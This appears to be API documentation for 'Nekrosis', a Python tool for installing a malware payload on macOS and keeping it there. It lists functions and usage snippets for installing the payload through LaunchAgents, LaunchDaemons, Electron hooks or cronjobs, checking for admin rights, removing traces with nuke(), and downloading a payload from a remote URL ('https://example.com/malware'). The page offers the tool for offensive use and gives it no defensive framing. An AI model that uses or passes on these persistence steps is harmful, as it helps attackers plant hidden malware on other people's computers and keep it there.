# Python API Usage

To use Nekrosis in your Python code, you will need to import the `Nekrosis` class from the `nekrosis` module:

::: code-group
```python [Python API]
from nekrosis import Nekrosis
```
:::

Once imported, let's create a basic instance of the `Nekrosis` class:

::: code-group
```python [Python API]
nekrosis = Nekrosis(
  payload="/path/to/malware"
)
```
:::

Here we have a number of functions we can call to interact with the `Nekrosis` class. The main functions of interest are:

| Function | Description |
|:---------|:------------|
| `supported_persistence_methods()` | List currently supported persistence methods. |
| `recommended_persistence_method()` | Return the recommended persistence method. |
| `install()` | Install the payload using the recommended persistence method. |
| `nuke()` | Remove the payload and Nekrosis from the system. |
| `current_privilege_level_str()` | Return the current privilege level as a string. |
| `is_admin()` | Check if the current user is an administrator. |
| `download_payload()` | Download file to temporary directory. |
| `change_payload()` | Change the payload to a new file. Run `reload()` to apply changes. |
| `change_custom_method()` | Change the custom method to a new method. Run `reload()` to apply changes. |
| `reload()` | Reload the Nekrosis instance to apply changes to payload or custom method. |
| `export_persistence_methods()` | Export the persistence methods to a supported format. |

## supported_persistence_methods()

* Description: List currently supported persistence methods.
* Return type: `List[str]`

::: code-group
```python [Python API]
>>> nekrosis.supported_persistence_methods()
['LaunchAgent - Current User', 'LaunchAgent - Electron', 'LaunchDaemon - Electron', 'Cronjob - Current User']
```
:::


## recommended_persistence_method()

* Description: Return the recommended persistence method.
* Return type: `str`

::: code-group
```python [Python API]
>>> nekrosis.recommended_persistence_method()
'LaunchAgent - Electron'
```
:::


## install()

* Description: Install the payload using the recommended persistence method.
* Return type: `None`


::: code-group
```python [Python API]
>>> nekrosis.install()
```
:::

## nuke()

* Description: Remove the payload and Nekrosis from the system.
* Return type: `None`

::: code-group
```python [Python API]
>>> nekrosis.nuke()
```


## current_privilege_level_str()


* Description: Return the current privilege level as a string.
* Return type: `str`

::: code-group
```python [Python API]
>>> nekrosis.current_privilege_level_str()
'Effective User ID: 502'
```
:::


## is_admin()

* Description: Check if the current user is an administrator.
* Return type: `bool`

::: code-group
```python [Python API]
>>> nekrosis.is_admin()
False
```

## download_payload()

* Description: Download file to temporary directory.
* Parameters:
  * `url`: str - The URL to download the payload from.
* Return type: `Bool` - True if the download was successful, False otherwise.

::: code-group
```python [Python API]
>>> nekrosis.download_payload("https://example.com/malware")
True
```

## change_payload()

* Description: Change the payload to a new file. Run `reload()` to apply changes.
* Parameters:
  * `payload`: str - The new payload file path.
* Return type: `None`

::: code-group
```python [Python API]
>>> nekrosis.change_payload("/path/to/new/malware")
```
:::


## change_custom_method()

* Description: Change the custom method to a new method. Run `reload()` to apply changes.
* Parameters:
  * `custom_method`: str - The new custom method.
* Return type: `None`

::: code-group
```python [Python API]
>>> nekrosis.change_custom_method("Cronjob - Current User")
```
:::


## reload()

* Description: Reload the Nekrosis instance to apply changes to payload or custom method.
* Return type: `None`

::: code-group
```python [Python API]
>>> nekrosis.reload()
```

## export_persistence_methods()

* Description: Export the persistence methods to a supported format.
* Parameters:
  * `method`: str - The method to export. Default is PLIST, supports XML and JSON.
* Return type: `str`

::: code-group
```python [Python API]
>>> nekrosis.export_persistence_methods()

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>persistence_methods</key>
	<array>
		<string>LaunchAgent - Current User</string>
		<string>LaunchAgent - Electron</string>
		<string>LaunchDaemon - Electron</string>
		<string>Cronjob - Current User</string>
	</array>
	<key>recommended_method</key>
	<string>LaunchAgent - Electron</string>
</dict>
</plist>
```
:::

